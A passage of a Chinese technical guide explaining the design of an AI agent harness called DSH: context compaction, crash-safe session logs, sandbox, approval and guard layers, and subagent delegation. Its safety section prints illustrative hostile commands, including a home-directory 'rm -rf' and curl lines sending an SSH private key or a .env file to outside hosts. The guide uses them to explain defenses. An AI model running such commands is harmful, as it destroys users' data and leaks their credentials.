class="pm-v">所有降级都要可追溯：原始数据永远别删</div></div></div></details><p>现在来处理第 8.3 节埋的伏笔。这一章是整份文档里技术密度最高的，也是最值得反复读的。</p>
+<h3>14.1 为什么必须压缩（用真实的数字算一遍）</h3>
+<p>假设你用的模型上下文窗口是 1,048,576 token（DSH 目录里 DeepSeek 官方路由就是这个数），每次请求的输出上限 256,000。一次请求的输入是“系统提示词 + 工具 schema + 全部历史”。</p>
+<p>如果你不压缩，第 N 轮的输入 ≈ 前 N−1 轮的总和，成本增长是<strong>近似二次的</strong>。一个连续干两小时的会话，最后几次请求每次可能要花掉几十万 token 的输入。</p>
+<p>而且有个硬墙：<strong>超过窗口，提供方直接报错</strong>。DSH 把这类错误归一化成 <code>CONTEXT_WINDOW_EXCEEDED</code>。如果没人处理，它就是一个终态错误<span class="dash">——</span>这一轮彻底失败。</p>
+<p>所以压缩不是“优化”，是<strong>让长任务能继续下去的必要条件</strong>。</p>
+<h3>14.2 什么时候触发：真实公式</h3>
+<p>大多数文章会说“用到 80% 就压缩”。DSH 的实际公式更细致：</p>
+<pre><code class="language-text">阈值 = min( 窗口 × 0.8 ,  窗口 − 输出预留 − 头部空间 )</code></pre>
+<ul><li>窗口 <code>W</code> = 模型声明的上下文窗口</li><li>输出预留 <code>O</code> = 本次请求的 maxTokens</li><li>头部空间 <code>B</code> = <code>headroomTokens</code>，默认 65,536</li></ul>
+<p>代入默认值算一遍（这一步很值得你自己算，能看清很多设计意图）：</p>
+<pre><code class="language-text">W = 1,048,576
+O = 256,000
+B = 65,536
+
+窗口 × 0.8          = 838,860
+窗口 − O − B        = 727,040     ← 这一项更小
+
+阈值 = 727,040 ≈ 窗口的 69.3%（不是一个整齐的 80%）
+保留尾部 = (W − O) × 0.16 ≈ 126,812 token</code></pre>
+<div class="aside-card"><div class="aside-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5"/><path d="M9 18h6"/><path d="M10 22h4"/></svg></div><div class="aside-content"><div class="aside-title">算一遍就懂</div><p>默认配置下真实触发点是窗口的 69.3%，不是直觉里的 80%。因为第二项「窗口 − 输出预留 − 头部空间」先命中了。这种「公式比直觉保守」的设计，在长任务里非常重要。</p></div></div>
+<p><strong>为什么要减掉 O 和 B？</strong> 因为你要给“模型的回答”和“摘要本身”留位置。如果你压到 99% 才动手，那时候连生成摘要的空间都没有了，直接死锁。<strong>这个细节是“能跑”和“稳定”的分界线。</strong></p>
+<p>顺带一个工程经验：配置错误要<strong>加载时就报错</strong>。DSH 校验“保留比例必须小于阈值比例”，否则你一启动就失败，而不是跑了半小时才发现压不下去。</p>
+<h3>14.3 两步走：先剪枝，再摘要</h3>
+<p>顺序是写死的，而且<strong>剪枝之后会重新测一次</strong><span class="dash">——</span>如果剪完已经够了，就完全省掉一次模型调用：</p>
+<pre><code class="language-text">测压
+  ↓ 超过阈值
+第一步：剪枝（确定性，不花钱）
+  ↓ 重新测压
+  ↓ 还是超
+第二步：摘要（要调一次模型，花钱）</code></pre>
+<p><strong>第一步：工具结果剪枝（prune）</strong></p>
+<p>规则极其简单粗暴，但有效：把每个工具结果<strong>只留头 4096 个字符 + 尾 1024 个字符</strong>，中间换成一行标记 <code>[... tool result middle pruned ...]</code>。整条结果超过 8192 字符才动手。</p>
+<p>为什么留头和尾？因为<strong>头通常是“命令 + 前几行结果”（有用），尾通常是“报错信息”（最有用）</strong>。中间那一大坨往往是重复的日志。</p>
+<p>这一步的妙处：<strong>确定性、零成本、可预测</strong>。不需要模型参与，跑完一定变小。</p>
+<p><strong>第二步：摘要（summarize）</strong></p>
+<p>如果剪枝还不够，就要把旧历史压成一段摘要。这里的每个细节都值得看：</p>
+<p><strong>（1）摘要 prompt 是一个 8 节的固定模板</strong>，不许缺节，空的写 <code>(none)</code>：</p>
+<pre><code class="language-text">■ Primary Request and Intent     用户最初和演变后的目标
+■ Key Technical Concepts        用到的技术、框架、约定
+■ Files and Code                精确路径：为什么重要、改了什么
+■ Errors and Fixes              报错：怎么解决的，以及相关反馈
+■ Pending Jobs                  明确要求但还没做完的
+■ Current Work                  此刻正在做什么
+■ Next Step                     下一个动作（只写一个）
+■ Critical Context              决策与理由、约束、用户偏好、未决问题</code></pre>
+<p>配套的规则里有一条特别值得抄：<strong>“逐字保留文件路径、命令、错误串、标识符、数值、函数签名”</strong>。因为这些东西一旦被“总结”成同义词，就再也找不回来了。</p>
+<p><strong>（2）摘要调用要“逐字回放”前缀。</strong> 这是全篇最漂亮的一个工程技巧：摘要请求不是“另写一段 prompt 让它总结”，而是<strong>把上一次请求的完整前缀（系统提示词 + 工具 schema + 历史）原样再发一遍</strong>，最后追加一段“现在请你压缩以上内容”的指令。</p>
+<p>为什么？因为这样<strong>只有尾部那一段是新的</strong>，前面的 KV cache 全部命中，摘要的成本从“重新读一遍全文”降到“只读一段新指令”。一个看似浪费 token 的设计，实际上是最省钱的写法。</p>
+<p><strong>（3）摘要不许变大。</strong> 落地前会校验：摘要的估算 token 数如果 ≥ 被替换内容的 token 数，直接报错 <code>summary is not smaller than the shadowed content</code>。<strong>防的是“压缩反而撑大”这种荒谬但真实会发生的 bug。</strong></p>
+<div class="embed-card"><div class="embed-label">机制</div><div class="embed-body"><svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="日志与 surface 的对照"><text x="0" y="14" font-size="13" fill="currentColor" opacity="0.6">磁盘上的会话日志　只追加，永不删除</text><g font-size="12" fill="currentColor"><rect x="0" y="26" width="100" height="52" rx="2" fill="var(--paper-2)" stroke="var(--line)"/><text x="50" y="57" text-anchor="middle">seq 101</text><rect x="110" y="26" width="100" height="52" rx="2" fill="var(--paper-2)" stroke="var(--line)"/><text x="160" y="57" text-anchor="middle">seq 102</text><rect x="220" y="26" width="100" height="52" rx="2" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="5 3"/><text x="270" y="57" text-anchor="middle">seq 103</text><rect x="330" y="26" width="100" height="52" rx="2" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="5 3"/><text x="380" y="57" text-anchor="middle">seq 104</text><rect x="440" y="26" width="100" height="52" rx="2" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="5 3"/><text x="490" y="57" text-anchor="middle">seq 105</text><rect x="550" y="26" width="100" height="52" rx="2" fill="var(--paper-2)" stroke="var(--line)"/><text x="600" y="57" text-anchor="middle">seq 250</text></g><text x="270" y="96" font-size="11" text-anchor="middle" fill="var(--accent)">被遮蔽的区间（replace 103 → 105）</text><text x="0" y="140" font-size="13" fill="currentColor" opacity="0.6">模型看到的 surface　deriveMessages() 之后</text><g font-size="12" fill="currentColor"><rect x="0" y="152" width="100" height="52" rx="2" fill="var(--paper-2)" stroke="var(--line)"/><text x="50" y="183" text-anchor="middle">seq 101</text><rect x="110" y="152" width="100" height="52" rx="2" fill="var(--paper-2)" stroke="var(--line)"/><text x="160" y="183" text-anchor="middle">seq 102</text><rect x="220" y="152" width="320" height="52" rx="2" fill="var(--paper-2)" stroke="var(--accent)" stroke-width="2"/><text x="380" y="176" text-anchor="middle" fill="var(--accent)">一条摘要消息</text><text x="380" y="194" text-anchor="middle" font-size="11" opacity="0.75">占原来 103–105 的位置</text><rect x="550" y="152" width="100" height="52" rx="2" fill="var(--paper-2)" stroke="var(--line)"/><text x="600" y="183" text-anchor="middle">seq 250</text></g><path d="M270 104 L270 126 L380 126 L380 146" fill="none" stroke="currentColor" stroke-width="1.2" opacity="0.5"/><path d="M375 140 L380 148 L385 140" fill="none" stroke="currentColor" stroke-width="1.2" opacity="0.5"/><text x="0" y="246" font-size="12" fill="currentColor" opacity="0.75">位置不变、编号不变、原文还在磁盘上；变的是「哪些节点参与下一次请求」。</text><text x="0" y="272" font-size="12" fill="currentColor" opacity="0.75">替换点之前的 token 前缀仍可命中提供方缓存，之后的全部失效——这就是压缩为什么要尽量往后压。</text></svg></div><div class="embed-caption">日志完整保留，模型只看 surface：压缩是「换书」，不是「撕书」。</div></div>
+<h3>14.4 压缩怎么做到“日志不删、模型看不见”</h3>
+<p>回到第 8.3 节的 surface 机制。核心只有两种操作：</p>
+<pre><code class="language-text">append                          正常追加一个节点
+replace { startSeq, endSeq }    把这段闭区间遮蔽掉，在原位置插入新事件</code></pre>
+<p>压缩做的事就是：往 surface 上写一条 <code>replace</code>，把“从第 3 条到第 40 条历史”替换成“一条摘要消息”。于是：</p>
+<ul><li><strong>磁盘上</strong>：原始事件一条不少，日志完整可回放。</li><li><strong>模型眼里</strong>：只看到摘要 + 之后的近期历史。</li><li><strong>形式上</strong>：位置不变（摘要在原来那段的位置），所以后面所有引用关系依然成立。</li></ul>
+<p>压缩在代码层面就是一次 <code>replace</code>：</p>
+<pre><code class="language-ts">// 把 surface 上 seq 12..51 这一段，换成一串摘要节点
+session.append('compaction/summary', { summary }, {
+  surfaceOp: { op: 'replace', startSeq: 12, endSeq: 51 },
+})
+// 日志里 12..51 一条不少；deriveMessages() 之后，模型只看到摘要</code></pre>
+<p>还有一个必须小心的地方，文档里专门警告过：<strong><code>startSeq</code>/<code>endSeq</code> 是“书架上的位置”，不是数值区间。</strong> 一次替换之后，新插入的摘要节点可能带着很高的 <code>seq</code> 落在很靠前的位置，于是下一次压缩时会出现 <code>startSeq > endSeq</code> 这种看起来不合法的情况。所以判断“到底遮蔽了哪些”要以 <code>shadowedSeqs</code> 为准，不要自己拿数字比大小。</p>
+<p><strong>对缓存的影响</strong>：替换发生在某个位置，该位置<strong>之前</strong>的前缀依然可以复用，<strong>之后</strong>的全部失效。这就是为什么剪枝只动中段（头尾不动可以保住更多前缀），也是为什么摘要要逐字回放。</p>
+<h3>14.5 失败了怎么办</h3>
+<p>这是最能看出工程成熟度的地方。三种失败，三种处理：</p>
+<figure class="table-wrap"><table><thead><tr><th>场景</th><th>处理</th><th>为什么</th></tr></thead><tbody><tr><td>自动压缩（pre-step）里摘要失败</td><td>记警告，<strong>继续这一轮</strong></td><td>压缩是维护动作，不该杀死正在进行的任务</td></tr><tr><td>真的超窗了（<code>CONTEXT_WINDOW_EXCEEDED</code>）</td><td>走 <code>agent/request-error</code>，<strong>绕过阈值</strong>做一次最大幅度收缩，然后重试</td><td>已经在悬崖边上了，没资格再讲究保留多少</td></tr><tr><td>收缩了但没变小</td><td><strong>不重试</strong></td><td>因为“没有进展”的重试只会白花钱</td></tr></tbody></table></figure>
+<p>最后一条有个技术细节：判断“有没有进展”的依据是 <code>replaceGeneration</code> 这个计数器有没有 +1。<strong>“只重试有证据表明情况变好了的操作”</strong><span class="dash">——</span>这个原则适用于所有重试逻辑。</p>
+<p>另外还有一条兜底：<strong>图片也会成为上下文炸弹</strong>。压缩器有一个专门的图片卸载插件，按请求顺序把最老的图片换成一段“占位文本 + 只读路径”，然后重试。它<strong>不占用提供方的重试预算</strong>，因为这是本地决定，不是模型调用失败。</p></section><section class="section" id="s-17"><div class="section-header"><div class="section-number">17</div><h2>15 · 持久化与恢复：崩溃之后还能接着干</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">恢复力</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">崩一次，两小时的活全白干</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">只追加、每条 fsync、版本化迁移、补写中断的尾巴</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">格式演进成本高，旧日志要长期维护 reader</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">数据格式第一天就要有版本号和迁移链，这是廉价的保险</div></div></div></details><p>一个 agent 如果一崩就前功尽弃，那它只能干 5 分钟以内的活。</p>
+<p>DSH 的持久化设计有四层，每层解决一个问题：</p>
+<p><strong>（1）格式：JSONL + 版本号</strong></p>
+<pre><code class="language-text">session.v4.jsonl.zstd      ← v4 = 当前格式；v1/v2/v3 是历史格式</code></pre>
+<p>一行一个事件，整体 zstd 压缩（也支持关掉压缩存纯文本，方便外部工具直接读）。第一行是头部，带 <code>version</code>。</p>
+<p><strong>为什么要版本号？</strong> 因为事件结构会演进。老版本写的日志，新版本要能读懂<span class="dash-em"><span class="dash">——</span>但不能“猜”。DSH 的做法是：<strong>每一代格式保留一个 frozen reader，并且只允许单向、相邻的迁移链（v0→v1→v2→v3→v4）</strong>。读到未来版本直接拒绝，而不是尽力解析。<strong>“宁可明确拒绝，不要错误解析”</strong><span class="dash">——</span></span>读错一份历史，比读不出来严重得多。</p>
+<p><strong>（2）写入：延迟实体化 + 每条都 fsync</strong></p>
+<p><code>create()</code> 时不写任何东西，第一次 append 才落盘。每次追加都 fsync，写失败就回滚到之前的字节长度。已提交的事件<strong>永不重写</strong>。</p>
+<p><strong>（3）崩溃恢复：修尾巴</strong></p>
+<p>进程被杀时，最后可能有一行写了一半。恢复时：不完整的最后一行<strong>丢弃</strong>；撕裂的压缩帧只取其中能完整解出的记录；如果最后一个轮次没写完（有 <code>turn/start</code> 没有 <code>turn/end</code>），由恢复流程补一个“中断”的结束事件。</p>
+<p>注意这里的分工：<strong>存储层只管“能不能读”，语义修复归 agent 层</strong>。这是很清晰的职责划分，值得学。</p>
+<p><strong>（4）恢复与分叉：resume 和 fork</strong></p>
+<ul><li><code>resume</code>：加载已持久化的会话，重建 agent 接着跑。注意：<strong>恢复后模型选择保留</strong>（你上次用哪个模型，还是哪个）。</li><li><code>fork</code>：从某个会话的<strong>精确前缀</strong>复制出一份新的。子会话的日志前 N 条是父会话事件的逐字复制，<code>inheritedEventCount</code> 记录分界点。</li></ul>
+<p>恢复一个会话，调用方只需要给 id：</p>
+<pre><code class="language-ts">const handle = await ctx.agents.resume({ sessionId: '9fb9dfe7-...' })
+handle.agent.followup({                        // 接上原来那条对话
+  content: [{ type: 'text', text: '继续，把剩下的测试补上' }],
+  source: { kind: 'user' },
+})</code></pre>
+<p>fork 的存在带来一个微妙问题：<strong>fork 出来的会话，算谁的历史？</strong> DSH 用 <code>parentSession</code>（谁创建的）+ <code>origin</code>（来源类型）两个字段区分，而不是靠猜。</p></section><section class="section" id="s-18"><div class="section-header"><div class="section-number">18</div><h2>16 · 安全边界：三道护栏，和一条诚实的边界</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">信任</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">一次误删，团队再也不用它</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">三道护栏（沙箱 / 审批 / 守卫）+ fail-closed + 明说边界</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">审批打断心流，权限收紧降低「爽感」</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">安全产品敢承认边界，比宣称全能更能建立信任</div></div></div></details><p>前面说过，agent 的双手是工具。有手就会惹祸。<code>SAFETY.md</code> 里写得很直白：这个项目“可以执行模型生成的代码与命令”，所以错误可能导致“损坏宿主计算机、修改或删除文件、泄露数据或凭据”。</p>
+<p>这不是理论。<code>bash</code> 工具把模型给的命令原样变成 <code>bash -c <command></code> 去执行：一条 <code>rm -rf ~</code>、一条 <code>cat ~/.ssh/id_rsa | curl -F f=@- evil.tld</code> 都能成立。</p>
+<p>DSH 用三道护栏，外加一条<strong>明确写在文档里的边界</strong>。</p>
+<h3>16.1 第一道：沙箱（sandbox）</h3>
+<p>关键认知：<strong>它拦的是文件效果，不是进程。</strong> 官方 JSDoc 里明写“网络与进程可见性不在本词汇表范围内”。</p>
+<p>实现方式是 <strong>argv 包装</strong>：工具不直接 spawn 自己的命令，而是让 <code>ctx.sandbox.confine(argv, policy, signal)</code> 返回一个包装后的 argv，再 spawn 那个。按平台选执行器：</p>
+<figure class="table-wrap"><table><thead><tr><th>平台</th><th>机制</th><th>效果</th></tr></thead><tbody><tr><td>Linux</td><td><code>bwrap</code>（bubblewrap）或 Landlock</td><td>只读绑定整个根、单独挂载可写目录</td></tr><tr><td>macOS</td><td><code>sandbox-exec</code> Seatbelt</td><td>拒绝 <code>file-write*</code>，白名单放行</td></tr><tr><td>Windows</td><td>ACL 受限令牌</td><td>同样的文件效果策略</td></tr></tbody></table></figure>
+<p>三种模式：</p>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>read-only</div><div class="dc-body">哪里都不能写，只有 <code>/dev/null</code> 能写。这是策略的 fail-safe 默认值。</div></div>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>workspace-write</div><div class="dc-body">能写会话工作区 + 显式允许的额外目录 + 平台临时目录。日常开发的默认。</div></div>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>danger-full-access</div><div class="dc-body">不做隔离，直接执行。用于你完全信任的场景。</div></div>
+<p><strong>没有可用的沙箱执行器时，直接拒绝（<code>SANDBOX_UNAVAILABLE</code>），绝不静默放行。</strong> 这个“失败要朝安全的方向失败”（fail-closed）的取向，贯穿整个安全层。</p>
+<h3>16.2 第二道：审批（approval）</h3>
+<p>当策略说“这个操作要问一下人”，就进审批流程。这里最重要的设计是<strong>一次性</strong>：</p>
+<ul><li>批准只有一种结果 <code>allowed-once</code>，<strong>没有“永远允许”</strong>。</li><li><code>rejected</code> / <code>cancelled</code> / <code>unavailable</code> <strong>一律当拒绝</strong>。</li><li>没有任何人能应答时（比如 SDK 里跑，没接 UI），默认拒绝。</li></ul>
+<p>四道 fail-closed 的闸门：没有应答者 → 拒绝；没装审批服务 → 拒绝；找不到该问哪个 agent → 拒绝；策略明写 <code>never</code> → 在瀑布之前就拒了，后挂的监听器插队也没用。</p>
+<p>判定逻辑本身只有三行<span class="dash">——</span><strong>没有“以后都允许”这个分支</strong>：</p>
+<pre><code class="language-ts">switch (decision) {
+  case 'allowed-once': return run()                       // 只有这一种「批准」
+  case 'rejected':
+  case 'cancelled':
+  case 'unavailable': return deny('需要重新确认')          // 其余一律拒绝（fail-closed）
+}</code></pre>
+<p>而且<strong>批准不会被持久化</strong>：重启之后，上次批过的事情不会自动继续批。这在安全上是正确的默认<span class="dash">——</span>但用户体验上意味着“续跑时要重新确认危险操作”。</p>
+<p>还有一个很实用的机制：<strong>升权（escalation）</strong>。工具 schema 里可以带 <code>sandbox_permissions</code> 和 <code>justification</code> 两个参数，即“我要用更宽的权限，理由是……”。允许的方向只有<strong>严格更宽</strong>（只读→工作区→全权），批准只作用于这一次调用，拒绝时错误信息会明确要求“停下来解释，而不是绕过去”。</p>
+<h3>16.3 第三道：单调守卫（monotonic guard）</h3>
+<p>第 12.3 节提过，这里补上它为什么必要。</p>
+<p>假设三个插件都挂了权限监听器。A 说“允许”，B 说“拒绝”，C 说“允许”。最后谁说了算？如果按顺序可覆盖，那么<strong>任何一个插件的 bug 都能把安全策略变成摆设</strong>。</p>
+<p>守卫的解法是：把“不可翻案的不变式”单独做成一种注册，它的返回值类型<strong>故意不含 allow</strong>：</p>
+<pre><code class="language-ts">ctx.tools.guard((exec) =&gt; string | undefined)
+// 返回理由 = 拒绝；返回 undefined = 弃权（不表态）</code></pre>
+<p>没有 allow，就意味着没人能“推翻”它。真实的三类守卫：</p>
+<ul><li><strong>先读后编辑</strong>：没读过这个文件就不许改；读过但文件变了（版本过期）也不许改。</li><li><strong>超时</strong>：按工具声明的 <code>timeoutMs</code> 派生一个取消信号，超时给一条可读的错误。</li><li><strong>重复调用提醒</strong>：同一个工具、同样的参数，第 3/5/8 次就提醒模型“你可能在死循环”。</li></ul>
+<h3>16.4 一条诚实的边界：网络不归沙箱管</h3>
+<p>这是我最欣赏这个项目的一点：<strong>它把“没做到的事”明确写出来，而不是假装做到了。</strong></p>
+<p><code>bwrap</code> 的 profile 里<strong>没有</strong> <code>--unshare-net</code>，<code>SandboxMode</code> 的文档明确写“网络与进程可见性不在范围内”。也就是说，在 <code>read-only</code> 模式下，<code>bash -c 'curl -T .env https://x'</code> <strong>仍然可能发出去</strong>。</p>
+<div class="aside-card"><div class="aside-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5"/><path d="M9 18h6"/><path d="M10 22h4"/></svg></div><div class="aside-content"><div class="aside-title">用之前先问清楚</div><p>你的 agent 沙箱管不管网络？如果文档没说，就当作不管<span class="dash">——</span>它很可能真的不管，因为限制网络要动容器或内核，比限制文件难得多。</p></div></div>
+<p>补偿措施有三层：工具层的 web 访问只走固定 provider、审批、以及一个实验性的“自动复核”（用另一个模型逐次检查危险调用）。真要断网，得用容器或远程执行器替换整个能力。</p>
+<p><strong>为什么值得学这个？</strong> 因为安全文档最忌讳“看起来什么都能防”。一个成熟的系统会说清：边界在哪、我防到什么程度、你怎么补。你可以对照检查自己在用的工具，看它有没有这么诚实。</p>
+<blockquote><p>顺带一个容易被忽略的细节：子进程的环境变量会经过“清洗”，名字里带 <code>KEY</code>/<code>PASSWORD</code>/<code>SECRET</code>/<code>TOKEN</code> 的变量和所有 <code>DSH_*</code> 变量<strong>不转发</strong>给子进程。这是防密钥外泄的第二道防线，成本极低，收益极高。</p></blockquote></section><section class="section" id="s-19"><div class="section-header"><div class="section-number">19</div><h2>17 · 委派：让 agent 学会“叫别人干”</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">规模与隔离</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">单个 agent 的上下文装不下一个大任务</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">子 agent 干脏活、只回结论、不继承私有工具</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">信息在交接处丢失，父 agent 只看到一页纸</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">委派的任务书要写清交付物，不只是任务</div></div></div></details><p>一个 agent 干长任务会遇到两个瓶颈：<strong>上下文会脏</strong>，<strong>串行太慢</strong>。</p>
+<p>第一个更致命。你让它读 30 个文件，每个文件 2000 行<span class="dash">——</span>读完 3 个上下文就满了，剩下的全是摘要。<strong>“读了但没记住”</strong> 是长任务失败最常见的原因。</p>
+<p>解法是委派：把“读 30 个文件”这件事扔给一个<strong>独立的 agent</strong>，它读、它脏、它只把结论交回来。父 agent 的上下文只增加一条消息。</p>
+<h3>17.1 两种委派，语义完全不同</h3>
+<p>DSH 提供两个工具，名字很像但机制相反：</p>
+<figure class="table-wrap"><table><thead><tr><th></th><th><code>subagent</code>（spawn，新建）</th><th><code>subagent_fork</code>（继承）</th></tr></thead><tbody><tr><td>子 agent 看到什么</td><td><strong>只有你给的任务描述</strong></td><td>父会话到此为止的<strong>完整历史</strong> + 任务描述</td></tr><tr><td>典型的说法</td><td>“去把 docs/ 下的接口都列出来”</td><td>“接着刚才那个问题往下查”</td></tr><tr><td>上下文成本</td><td>最低</td><td>高（等于复制了一份历史）</td></tr><tr><td>适合</td><td>自足的子任务</td><td>需要前情提要的接续、审查、二次加工</td></tr></tbody></table></figure>
+<p>判断标准很简单：<strong>如果这个子任务交给一个刚进项目的人也能做，就用 spawn；如果必须先跟他讲半小时前情，就用 fork。</strong></p>
+<h3>17.2 结果怎么回来：一条通知，不是一段结果</h3>
+<p>这是 DSH 一个反直觉但很重要的设计。</p>
+<p>大多数框架里，“调用子 agent”是一个工具调用，子 agent 的完整输出就是工具结果。DSH 不这样：</p>
+<ul><li>工具本身<strong>立刻返回</strong>，内容只有 <code>{ kind: 'activation', name: 'agent-1' }</code>，渲染成 <code>started subagent agent-1</code>。</li><li>子 agent 干完之后，父 agent 会收到一条 <strong>user 角色的通知</strong>，第一行是固定的：</li></ul>
+<pre><code class="language-text">Background subagent agent-1 finished and will do no further work unless you send it more.</code></pre>
+<p>正文只有子 agent <strong>最后一条非空 assistant 消息</strong>的文本。</p>
+<div class="embed-card"><div class="embed-label">上下文经济学</div><div class="embed-body"><svg viewBox="0 0 680 240" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="父子上下文体积对比"><g fill="currentColor"><text x="0" y="16" font-size="13" opacity="0.6">父 agent 的上下文</text><rect x="0" y="28" width="300" height="72" rx="3" fill="var(--paper-2)" stroke="var(--line)"/><rect x="14" y="76" width="42" height="14" rx="2" fill="var(--accent)" opacity="0.85"/><text x="14" y="62" font-size="12">原有历史</text><text x="66" y="88" font-size="12" fill="var(--accent)">+ 约 500 token</text></g><g fill="currentColor"><text x="380" y="16" font-size="13" opacity="0.6">子 agent 的上下文（随后被丢弃）</text><rect x="380" y="28" width="300" height="72" rx="3" fill="var(--paper-2)" stroke="var(--line)"/><rect x="394" y="76" width="272" height="14" rx="2" fill="var(--accent)" opacity="0.35"/><text x="394" y="62" font-size="12">读 30 个文件、跑 20 条命令</text><text x="394" y="88" font-size="12">约 200,000 token</text></g><path d="M380 130 L120 130" fill="none" stroke="currentColor" stroke-width="1.2" opacity="0.5"/><path d="M128 125 L118 130 L128 135" fill="none" stroke="currentColor" stroke-width="1.2" opacity="0.5"/><text x="250" y="122" font-size="12" text-anchor="middle" fill="currentColor" opacity="0.8">只把最后一条消息交回去</text><g fill="currentColor"><rect x="0" y="156" width="680" height="58" rx="3" fill="none" stroke="var(--accent)" stroke-width="1.2" stroke-dasharray="5 3"/><text x="14" y="180" font-size="12" fill="var(--accent)">一句话记住这个交易</text><text x="14" y="200" font-size="12">用 99.75% 的上下文做脏活，只把结论带回主线程——这是长任务能跑下去的真正原因。</text></g></svg></div><div class="embed-caption">委派的本质是一次上下文交易：拿子 agent 的脏活换父 agent 的干净。</div></div>
+<p>也就是说，<strong>父 agent 拿到的是一页纸的报告，不是子 agent 的完整工作记录</strong>。子 agent 翻了哪些文件、跑了什么命令、推理过程是什么<span class="dash">——</span>全部留在子会话里，不进父上下文。</p>
+<p>这项设计的收益要量化才能体会：一个读了 30 个文件的子 agent，它的 transcript 可能是 20 万 token；而回到父 agent 的那条通知是 500 token。<strong>省了 99.75% 的上下文。</strong></p>
+<p>代价也很真实：<strong>如果子 agent 没把关键信息写进最后的总结，父 agent 就永远不知道。</strong> 所以写委派任务的 prompt 时，“要求它在最后汇报什么”比“要求它做什么”更需要斟酌。</p>
+<h3>17.3 三个必须知道的限制</h3>
+<p><strong>（1）子 agent 看不到父 agent 的私有工具。</strong> 这来自 scope 机制：注册要么是全局的，要么恰好属于某一个 agent，<strong>带作用域的注册不向下继承</strong>。父 agent 通过 <code>agent.ctx</code> 注册的工具/提示词段/限制，子 agent 一个都看不到。</p>
+<p>想给子 agent 特定能力，正确做法是<strong>给它一个 agent preset</strong>（一套预设的插件组合），而不是指望继承。</p>
+<p><strong>（2）并发有上限。</strong> 每棵委派树的活跃子 agent 默认上限 <strong>8</strong>，根不占名额；超额直接报 <code>ACTIVATION_LIMIT_REACHED</code>，<strong>不排队</strong>（因为排队会让“我以为派出去了”变成幻觉）。</p>
+<p><strong>（3）深度默认只有 1 层。</strong> 也就是“你可以派子 agent，但子 agent 不能再派”。默认 1 是有道理的：委派深度一深，成本和不可控性指数上升。需要更深得显式配置。</p>
+<p>而且当深度到顶时，运行时上下文会<strong>明确告诉模型</strong>：大意是「当前深度 1、上限 1、剩余 0 层，不要在这个深度再调用 subagent」。<strong>把限制写进模型能看见的地方</strong>，比让模型试错撞墙优雅得多。</p>
+<h3>17.4 workflow：把委派写成一段脚本</h3>
+<p>如果你要做的不是“派一个”，而是“派 20 个，然后汇总”，一个一个调工具就太低效。DSH 的方案是让模型<strong>写一段 JavaScript</strong>：</p>
+<pre><code class="language-js">const files = args.files
+const results = await pipeline(files,
+  f =&gt; agent(`审查 ${f} 的类型安全`, { label: f }),
+  r =&gt; agent(`复核这条结论：${r}`, { label: 'verify' })
+)
+return results.filter(Boolean)</code></pre>
+<p>脚本里可用的钩子一共五个：</p>
+<figure class="table-wrap"><table><thead><tr><th>钩子</th><th>作用</th></tr></thead><tbody><tr><td><code>agent(prompt, opts)</code></td><td>起一个子 agent，等它完成，拿到结果（可要求 JSON 结构）</td></tr><tr><td><code>pipeline(items, ...stages)</code></td><td>每个 item 独立走完所有阶段，<strong>阶段之间不等</strong>（流水线，不是批次）</td></tr><tr><td><code>parallel(thunks)</code></td><td>并发跑完所有，等全部结束</td></tr><tr><td><code>phase(title)</code> / <code>log(msg)</code></td><td>进度分组与叙述，只影响界面显示</td></tr></tbody></table></figure>
+<p>注意 <code>pipeline</code> 和 <code>parallel</code> 的区别，这是并行编排的核心概念：</p>
+<ul><li><code>parallel</code> 是<strong>屏障</strong>：20 个人同时干，全干完才进下一步。</li><li><code>pipeline</code> 是<strong>流水线</strong>：第 1 个文件进第二道工序时，第 2 个文件还在第一道<span class="dash">——</span>没有等待，总时间更短。</li></ul>
+<p>什么时候用哪个？如果第二阶段需要“全部结果放在一起看”，必须用 <code>parallel</code>；如果每个 item 独立走完全程，用 <code>pipeline</code> 快得多。<strong>这是能在任何编排框架里复用的判断。</strong></p>
